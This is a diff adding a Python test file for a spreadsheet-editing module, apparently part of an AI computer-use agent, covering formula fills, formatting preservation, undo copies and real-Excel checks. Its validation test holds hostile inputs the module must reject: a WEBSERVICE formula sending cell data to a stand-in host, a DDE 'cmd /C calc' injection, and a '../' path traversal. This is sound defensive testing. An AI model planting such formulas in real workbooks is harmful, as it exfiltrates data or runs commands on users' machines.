@@ -1,0 +1,152 @@
+"""Spreadsheets: structure first, formulas not typing, preservation, and real Excel where it exists."""
+import sys
+import tempfile
+import threading
+import unittest
+from pathlib import Path
+
+sys.path.insert(0, str(Path(__file__).resolve().parents[1]))
+import ocade_sheets  # noqa: E402
+from ocade_computer import Computer  # noqa: E402
+
+ORDERS = [("North", "Laptop", 4, 950), ("South", "Monitor", 10, 180), ("East", "Laptop", 2, 950),
+          ("West", "Keyboard", 25, 45), ("North", "Monitor", 6, 180), ("South", "Laptop", 1, 950)]
+RATES = [("North", 0.08), ("South", 0.06), ("East", 0.07), ("West", 0.05)]
+
+
+def workbook(path: Path) -> None:
+    """A realistic book: orders to finish, a rates table to look up, and a sheet nobody asked to touch."""
+    from openpyxl import Workbook
+    from openpyxl.styles import Font
+    book = Workbook()
+    orders = book.active
+    orders.title = "Orders"
+    orders.append(["Region", "Product", "Units", "Unit price", "Revenue", "Tax"])
+    for row in ORDERS:
+        orders.append(list(row))
+    rates = book.create_sheet("Rates")
+    rates.append(["Region", "Rate"])
+    for row in RATES:
+        rates.append(list(row))
+    notes = book.create_sheet("Notes")
+    notes["A1"] = "Prepared by finance"
+    notes["A1"].font = Font(bold=True, color="C00000")
+    notes["B2"] = "=1+1"
+    book.save(path)
+
+
+# What a person would ask for, done with formulas and structure rather than typing results.
+FINISH_ORDERS = [
+    {"op": "fill", "range": "E2:E7", "formula": "=C2*D2"},
+    {"op": "fill", "range": "F2:F7", "formula": "=E2*VLOOKUP(A2,Rates!$A$2:$B$5,2,FALSE)"},
+    {"op": "set", "cell": "D8", "value": "Total"},
+    {"op": "set", "cell": "E8", "value": "=SUM(E2:E7)"},
+    {"op": "set", "cell": "F8", "value": "=SUM(F2:F7)"},
+    {"op": "format", "range": "A1:F1", "bold": True, "fillColor": "#1F4E79", "fontColor": "#FFFFFF",
+     "align": "center"},
+    {"op": "format", "range": "D2:F8", "numberFormat": "$#,##0.00"},
+    {"op": "format", "range": "A1:F8", "border": "thin"},
+    {"op": "format", "range": "D8:F8", "bold": True},
+    {"op": "conditional", "range": "E2:E7", "rule": "greater", "value": 2000, "fillColor": "#C6EFCE",
+     "fontColor": "#006100"},
+    {"op": "freeze", "cell": "A2"},
+    {"op": "format", "range": "A1:F8", "columnWidth": "auto"},
+]
+
+
+class ValidationTest(unittest.TestCase):
+    def test_refuses_what_is_unsafe_or_malformed(self):
+        for ops in ([{"op": "set", "cell": "A1", "value": '=WEBSERVICE("https://x.test/?"&B1)'}],
+                    [{"op": "set", "cell": "A1", "value": "=[Other.xlsx]Sheet1!A1"}],
+                    [{"op": "fill", "range": "A1:A3", "formula": "=cmd|' /C calc'!A0"}],
+                    [{"op": "set", "cell": "ZZZZ1", "value": 1}],
+                    [{"op": "format", "range": "A1", "fillColor": "red"}],
+                    [{"op": "drop_everything"}], []):
+            with self.assertRaises(ocade_sheets.SheetError, msg=str(ops)):
+                ocade_sheets.validate(ops)
+        ocade_sheets.validate([{"op": "set", "cell": "A1", "value": '="WEBSERVICE( is just text"'}])
+
+
+class FileEngineTest(unittest.TestCase):
+    def setUp(self):
+        self.root = Path(tempfile.mkdtemp())
+        self.book = self.root / "sales.xlsx"
+        workbook(self.book)
+
+    def test_inspect_shows_structure_and_formulas(self):
+        seen = ocade_sheets.inspect(self.book)
+        self.assertEqual([s["name"] for s in seen["sheets"]], ["Orders", "Rates", "Notes"])
+        self.assertEqual(seen["cells"][0][0], {"cell": "A1", "value": "Region"})
+        notes = ocade_sheets.inspect(self.book, "Notes")
+        self.assertEqual(notes["cells"][1][0]["formula"], "=1+1")
+
+    def test_edits_with_formulas_and_preserves_the_rest(self):
+        out = ocade_sheets.edit(self.book, "Orders", FINISH_ORDERS, self.root / "undo", threading.Event(),
+                                engine="file")
+        self.assertTrue(out["ok"], out)
+        from openpyxl import load_workbook
+        book = load_workbook(self.book)
+        orders = book["Orders"]
+        self.assertEqual(orders["E7"].value, "=C7*D7")  # filled relative, not typed
+        self.assertEqual(orders["F3"].value, "=E3*VLOOKUP(A3,Rates!$A$2:$B$5,2,FALSE)")
+        self.assertEqual(orders["E8"].value, "=SUM(E2:E7)")
+        self.assertEqual(orders["D2"].number_format, "$#,##0.00")
+        self.assertTrue(orders["A1"].font.bold)
+        self.assertEqual(orders.freeze_panes, "A2")
+        notes = book["Notes"]
+        self.assertEqual(notes["A1"].value, "Prepared by finance")
+        self.assertTrue(notes["A1"].font.bold)
+        self.assertEqual(notes["B2"].value, "=1+1")
+        self.assertEqual(len(list((self.root / "undo").iterdir())), 1)  # the original was kept
+
+    def test_refuses_to_damage_what_it_cannot_keep(self):
+        from openpyxl import load_workbook
+        from openpyxl.chart import BarChart, Reference
+        book = load_workbook(self.book)
+        chart = BarChart()
+        chart.add_data(Reference(book["Orders"], min_col=3, min_row=1, max_row=7), titles_from_data=True)
+        book["Orders"].add_chart(chart, "H2")
+        book.save(self.book)
+        with self.assertRaises(ocade_sheets.SheetError):
+            ocade_sheets.edit(self.book, "Orders", FINISH_ORDERS[:1], self.root / "undo", threading.Event(),
+                              engine="file")
+
+    def test_through_the_computer_stays_in_the_workspace(self):
+        pc = Computer(str(self.root))
+        self.assertEqual(pc.run({"action": "sheet_inspect", "path": "sales.xlsx"})["status"], "done")
+        self.assertEqual(pc.run({"action": "sheet_inspect", "path": "../x.xlsx"})["status"], "blocked")
+        self.assertEqual(pc.run({"action": "sheet_inspect", "path": "sales.xlsx",
+                                 "sheet": "Missing"})["status"], "failed")
+
+
+@unittest.skipUnless(ocade_sheets.excel_available(), "needs Microsoft Excel (Windows)")
+class RealExcelTest(unittest.TestCase):
+    """The acceptance task in the person's real Excel: visible, calculated, saved, reopened, verified."""
+
+    def test_finish_the_orders_sheet_in_excel(self):
+        root = Path(tempfile.mkdtemp())
+        path = root / "sales.xlsx"
+        workbook(path)
+        out = ocade_sheets.edit(path, "Orders", FINISH_ORDERS, root / "undo", threading.Event(),
+                                engine="excel", close=True)
+        self.assertTrue(out["ok"], out)
+        self.assertTrue(out["savedAndReopened"], "the saved file did not read back the same")
+        revenue = [sum(u * p for _, _, u, p in ORDERS)]
+        shown = out["read"]["E8"]["text"][0][0]
+        self.assertEqual(shown, f"${revenue[0]:,.2f}")  # Excel's own calculation and number format
+        rate = dict(RATES)
+        tax = sum(u * p * rate[r] for r, _, u, p in ORDERS)
+        self.assertEqual(out["read"]["F8"]["text"][0][0], f"${tax:,.2f}")
+        self.assertEqual(out["read"]["E2:E7"]["formulas"][5][0], "=C7*D7")
+        # Saved values are in the file itself, for any program that opens it next.
+        from openpyxl import load_workbook
+        values = load_workbook(path, data_only=True)
+        self.assertAlmostEqual(values["Orders"]["F8"].value, tax, places=6)
+        formulas = load_workbook(path)
+        self.assertEqual(formulas["Notes"]["A1"].value, "Prepared by finance")
+        self.assertTrue(formulas["Notes"]["A1"].font.bold)
+        self.assertEqual(formulas["Orders"].conditional_formatting._cf_rules.__len__(), 1)
+
+
+if __name__ == "__main__":
+    unittest.main()
